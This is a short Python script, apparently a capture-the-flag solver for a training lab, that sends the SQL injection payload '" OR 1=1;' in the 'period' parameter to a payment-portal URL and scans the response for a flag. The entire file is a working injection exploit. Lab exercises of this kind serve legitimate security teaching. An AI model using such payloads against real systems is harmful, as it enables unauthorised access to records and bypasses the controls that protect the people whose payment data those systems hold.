import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))

from utils import get_session, find_flag

BASE_URL = "https://payportal.quoccacorp.com"
PAYLOAD = '" OR 1=1;'

class Solver:
    def __init__(self):
        self.session = get_session()

    def run(self):
        response = self.session.get(BASE_URL, params={"period": PAYLOAD})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().run()